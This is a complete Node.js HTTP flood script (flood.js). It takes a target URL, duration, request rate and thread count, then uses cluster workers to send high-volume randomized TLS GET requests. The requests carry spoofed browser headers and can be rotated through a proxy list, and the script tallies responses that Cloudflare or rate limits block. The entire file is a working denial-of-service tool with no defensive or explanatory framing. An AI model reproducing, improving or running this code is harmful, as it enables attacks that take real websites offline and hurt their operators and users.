const net = require("net");
const tls = require("tls");
const http = require("http");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");

process.setMaxListeners(0);

if (process.argv.length < 5) {
    console.log(`Usage: node flood.js <url> <time> <rate> <threads>`);
    console.log(`Example: node flood.js https://target.com 180 200 4`);
    process.exit();
}

const useProxy = process.argv[6] !== "--noproxy";
const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),  // 200
    threads: parseInt(process.argv[5])
};

const parsedTarget = url.parse(args.target);

// Browser ciphers
const ciphers = "TLS_AES_256_GCM_SHA384:TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256";

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36"
];

let proxies = [];
if (useProxy) {
    try {
        proxies = fs.readFileSync("proxy.txt", "utf8").split(/\r?\n/).filter(l => l.trim());
        console.log(`📡 Loaded ${proxies.length} proxies`);
    } catch(e) { console.log(`Direct mode`); }
}

let stats = { total: 0, success: 0, blocked: 0, error: 0, active: 0 };

if (cluster.isMaster) {
    console.log(`\n🔥 FLOOD | ${args.target}`);
    console.log(`⏱️ ${args.time}s | ⚡ ${args.rate} req/s | 🧵 ${args.threads} threads\n`);
    
    setInterval(() => {
        console.log(`[${new Date().toLocaleTimeString()}] T:${stats.total} ✅:${stats.success} 🚫:${stats.blocked} ❌:${stats.error} 🔗:${stats.active}`);
    }, 3000);
    
    for (let i = 0; i < args.threads; i++) cluster.fork();
    
    setTimeout(() => {
        console.log(`\n✅ DONE | Total: ${stats.total} | Success: ${stats.success} | Blocked: ${stats.blocked}`);
        process.exit(1);
    }, args.time * 1000);
} else {
    // ============ MULTIPLE INTERVALS ============
    // Biar bisa 200 req/s per worker
    const intervalsPerWorker = Math.min(2000, args.rate);
    const delayPerInterval = Math.max(1, Math.floor(1000 / (args.rate / intervalsPerWorker)));
    
    console.log(`Worker ${cluster.worker.id} | ${intervalsPerWorker} intervals | delay ${delayPerInterval}ms`);
    
    for (let i = 0; i < intervalsPerWorker; i++) {
        setTimeout(() => {
            setInterval(() => {
                if (stats.active < 10000) {
                    runFlooder();
                }
            }, delayPerInterval);
        }, i * 1);
    }
}

function runFlooder() {
    stats.active++;
    
    const sendHttp11 = (socket, proxyConn) => {
        const randomPath = parsedTarget.path + 
            (parsedTarget.path.includes("?") ? "&" : "?") + 
            "r=" + Math.random() + "&_=" + Date.now();
        
        const ua = userAgents[Math.floor(Math.random() * userAgents.length)];
        
        const request = `GET ${randomPath} HTTP/1.1\r\n` +
            `Host: ${parsedTarget.host}\r\n` +
            `User-Agent: ${ua}\r\n` +
            `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n` +
            `Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7\r\n` +
            `Accept-Encoding: gzip, deflate, br\r\n` +
            `Cache-Control: no-cache\r\n` +
            `Sec-Ch-Ua: "Google Chrome";v="123"\r\n` +
            `Sec-Ch-Ua-Mobile: ?0\r\n` +
            `Sec-Ch-Ua-Platform: "Windows"\r\n` +
            `Sec-Fetch-Dest: document\r\n` +
            `Sec-Fetch-Mode: navigate\r\n` +
            `Sec-Fetch-Site: none\r\n` +
            `Upgrade-Insecure-Requests: 1\r\n` +
            `Connection: keep-alive\r\n\r\n`;
        
        socket.write(request);
        
        socket.once("data", (chunk) => {
            const resp = chunk.toString();
            stats.total++;
            if (resp.includes("200") || resp.includes("301") || resp.includes("302")) {
                stats.success++;
            } else if (resp.includes("403") || resp.includes("429") || resp.includes("503") || resp.includes("Cloudflare")) {
                stats.blocked++;
            } else {
                stats.error++;
            }
            socket.destroy();
            if (proxyConn) proxyConn.destroy();
            stats.active--;
        });
        
        setTimeout(() => {
            if (!socket.destroyed) {
                socket.destroy();
                if (proxyConn) proxyConn.destroy();
                stats.active--;
            }
        }, 1000);
    };
    
    const makeRequest = (proxyConn = null) => {
        const tlsOptions = {
            host: parsedTarget.host,
            port: 443,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            ciphers: ciphers,
            honorCipherOrder: true,
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3",
            ALPNProtocols: ["http/1.1"]
        };
        
        if (proxyConn) tlsOptions.socket = proxyConn;
        
        const tlsConn = tls.connect(tlsOptions);
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true);
        
        tlsConn.once("secureConnect", () => {
            sendHttp11(tlsConn, proxyConn);
        });
        
        tlsConn.on("error", () => {
            stats.total++;
            stats.error++;
            if (proxyConn) proxyConn.destroy();
            stats.active--;
        });
    };
    
    if (useProxy && proxies.length > 0) {
        const proxyAddr = proxies[Math.floor(Math.random() * proxies.length)];
        const [pHost, pPort] = proxyAddr.split(":");
        
        const proxyConn = net.connect({ host: pHost, port: parseInt(pPort), allowHalfOpen: true });
        proxyConn.setTimeout(5000);
        
        const connectPayload = `CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}\r\nUser-Agent: ${userAgents[0]}\r\n\r\n`;
        
        proxyConn.on("connect", () => {
            proxyConn.write(connectPayload);
        });
        
        proxyConn.on("data", (chunk) => {
            const resp = chunk.toString();
            if (resp.includes("200 Connection established") || resp.includes("200 OK")) {
                proxyConn.removeAllListeners("data");
                makeRequest(proxyConn);
            } else {
                proxyConn.destroy();
                stats.active--;
            }
        });
        
        proxyConn.on("error", () => {
            stats.active--;
        });
        
        proxyConn.on("timeout", () => {
            proxyConn.destroy();
            stats.active--;
        });
    } else {
        makeRequest(null);
    }
}
